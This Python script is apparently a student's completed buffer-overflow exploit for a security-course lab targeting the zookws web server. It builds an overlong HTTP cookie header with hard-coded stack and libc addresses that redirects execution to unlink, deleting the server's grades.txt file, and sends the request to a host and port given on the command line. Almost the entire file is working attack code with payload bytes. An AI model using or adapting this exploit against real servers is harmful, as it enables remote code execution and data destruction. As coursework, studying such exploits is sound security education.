#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0x34567890
stack_saved_ebp = 0x12345678
stack_retaddr = stack_saved_ebp + 4

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)
    
    # start of reqpath buffer in zookd is 0xbfffee08.
    ## 'pattern' varible  fills in the buffer with 'a' until we overwrite the return addr to point
    ##  to unlink syscall function and the arguments to the syscall are passed afterward.
    ## 'filename' variable has the binary encoding of the location of the file that we want to delete.
    ## also it is placed at a specific offset after the original pattern because we want
    ## '\0' to be the byte following the filename and since url_encode function which we are
    ## exploiting tends to break and return upon encountering this varibale (not saving it) the 
    ## program used existing stack to get this done.  
    pattern = ('a'*536) + "\x50\x24\x10\x40" + "\x61\x8e\x04\x08" + "\x75\xde\xff\xbf"
    filename = ('b'*93)  + "\x2f\x68\x6f\x6d\x65\x2f\x68\x74\x74\x70\x64\x2f\x67\x72\x61\x64\x65\x73\x2e\x74\x78\x74"
    pattern = pattern + filename	
    #pattern = ('a'*536)
    #print(pattern)	
    file = open('shellcode.bin','rb')
    if(file):
        bincode = file.read()
        print("length of generated binary code = {}".format(len(bincode)))
        #pattern = bincode + pattern[len(bincode):]
    req = "GET /zoobar/users.py HTTP/1.0\r\n" + \
	   "cookie: " + pattern + "\r\n"  + "\r\n"	
    print("length of generated payload = {}".format(len(req)))
    #print(':'.join(x.encode('hex') for x in req))
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	resp = resp + rbuf
	rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

